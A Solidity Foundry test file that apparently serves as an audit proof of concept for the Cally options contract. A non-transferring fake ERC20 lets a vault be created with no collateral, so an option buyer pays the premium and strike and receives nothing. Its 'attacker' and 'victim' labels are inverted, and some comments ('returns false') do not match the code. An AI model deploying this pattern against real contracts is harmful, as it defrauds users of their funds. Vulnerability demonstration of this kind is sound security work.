// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../shared/Fixture.t.sol";
import "src/Cally.sol";

// Malicious ERC20 token that returns false on transfer (like ZRX)
contract MaliciousERC20 {
    string public name = "Malicious Token";
    string public symbol = "MAL";
    uint8 public decimals = 18;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    uint256 public totalSupply;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
        emit Transfer(address(0), to, amount);
    }

    function transfer(address to, uint256 amount) external {
        // Don't return anything (empty response) to bypass SafeTransferLib checks
        // This simulates tokens that don't follow ERC20 standard properly
    }

    function transferFrom(address from, address to, uint256 amount) external {
        // Don't return anything (empty response) to bypass SafeTransferLib checks
        // This simulates tokens that don't follow ERC20 standard properly
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }
}

contract ExploitTest is Test, Fixture {
    MaliciousERC20 internal maliciousToken;
    address internal attacker;
    address internal victim;

    event NewVault(uint256 indexed vaultId, address indexed from, address indexed token);
    event BoughtOption(uint256 indexed optionId, address indexed from, address indexed token);
    event ExercisedOption(uint256 indexed optionId, address indexed from);

    function setUp() public {
        // Deploy malicious token
        maliciousToken = new MaliciousERC20();

        // Setup addresses
        attacker = address(0x123456789);
        victim = address(0x987654321);
        vm.label(attacker, "Attacker");
        vm.label(victim, "Victim");

        // Fund attacker with ETH for buying options
        vm.deal(attacker, 10 ether);

        // Mint tokens to victim (these will never actually be transferred)
        vm.prank(victim);
        maliciousToken.mint(victim, 1000 * 10**18);

        // Victim approves the Cally contract to spend tokens
        vm.prank(victim);
        maliciousToken.approve(address(c), 1000 * 10**18);
    }

    function testExploitMaliciousERC20TransferFailure() public {
        // Step 1: Victim creates a vault with malicious ERC20 tokens
        // The transfer will fail (return false) but createVault doesn't check the return value
        vm.prank(victim);
        uint256 vaultId = c.createVault(
            1000 * 10**18,  // amount
            address(maliciousToken),  // malicious token
            0,  // premium index (0.01 ether)
            7,  // duration days
            0,  // dutch auction starting strike index (1 ether)
            0,  // dutch auction reserve strike
            Cally.TokenType.ERC20
        );

        // Verify vault was created despite failed token transfer
        assertEq(c.ownerOf(vaultId), victim, "Vault should be created for victim");

        // Verify the contract never received the tokens (balance should be 0)
        assertEq(maliciousToken.balanceOf(address(c)), 0, "Cally should have 0 malicious tokens");

        // Step 2: Attacker buys an option from the empty vault
        vm.warp(block.timestamp + 1 days); // Ensure auction has started

        vm.prank(attacker);
        uint256 optionId = c.buyOption{value: 0.01 ether}(vaultId);

        // Verify option was purchased
        assertEq(c.ownerOf(optionId), attacker, "Attacker should own the option");

        // Verify victim received the premium despite having no collateral
        uint256 victimEthBalance = c.ethBalance(victim);
        assertEq(victimEthBalance, 0.01 ether, "Victim should have received premium");

        // Step 3: Attacker exercises the option
        // Get current strike price
        Cally.Vault memory vault = c.vaults(vaultId);
        uint256 strikePrice = vault.currentStrike;

        // Attacker exercises the option
        vm.prank(attacker);
        c.exercise{value: strikePrice}(optionId);

        // Verify the vulnerability: attacker paid strike price but received no tokens
        // The contract still has 0 malicious tokens, so attacker gets nothing
        assertEq(maliciousToken.balanceOf(attacker), 0, "Attacker should receive no tokens");

        // But victim received both premium and strike price for tokens they never deposited!
        uint256 victimFinalEthBalance = c.ethBalance(victim);
        assertEq(victimFinalEthBalance, 0.01 ether + strikePrice, "Victim should have premium + strike");

        // Step 4: Victim harvests their ill-gotten gains
        uint256 victimInitialBalance = victim.balance;
        vm.prank(victim);
        uint256 harvestedAmount = c.harvest();

        assertEq(harvestedAmount, 0.01 ether + strikePrice, "Victim should harvest all ETH");
        assertEq(victim.balance, victimInitialBalance + harvestedAmount, "Victim's ETH balance should increase");

        // Attacker lost money: paid premium + strike but got no tokens
        uint256 attackerTotalLoss = 0.01 ether + strikePrice;
        assertEq(attacker.balance, 10 ether - attackerTotalLoss, "Attacker should have lost money");
    }

    function testVaultCreationFailsSilentlyWithMaliciousToken() public {
        // This test demonstrates that vault creation succeeds even when token transfer fails

        // Check initial state
        assertEq(maliciousToken.balanceOf(victim), 1000 * 10**18, "Victim should have initial tokens");
        assertEq(maliciousToken.balanceOf(address(c)), 0, "Cally should have 0 tokens initially");

        // Create vault (transfer will fail silently)
        vm.prank(victim);
        uint256 vaultId = c.createVault(
            1000 * 10**18,
            address(maliciousToken),
            0,
            7,
            0,
            0,
            Cally.TokenType.ERC20
        );

        // Verify vault was created
        assertTrue(c.ownerOf(vaultId) != address(0), "Vault should be created");

        // But tokens were never transferred
        assertEq(maliciousToken.balanceOf(victim), 1000 * 10**18, "Victim should still have all tokens");
        assertEq(maliciousToken.balanceOf(address(c)), 0, "Cally should still have 0 tokens");

        // This proves the vulnerability: vault exists without collateral
    }
}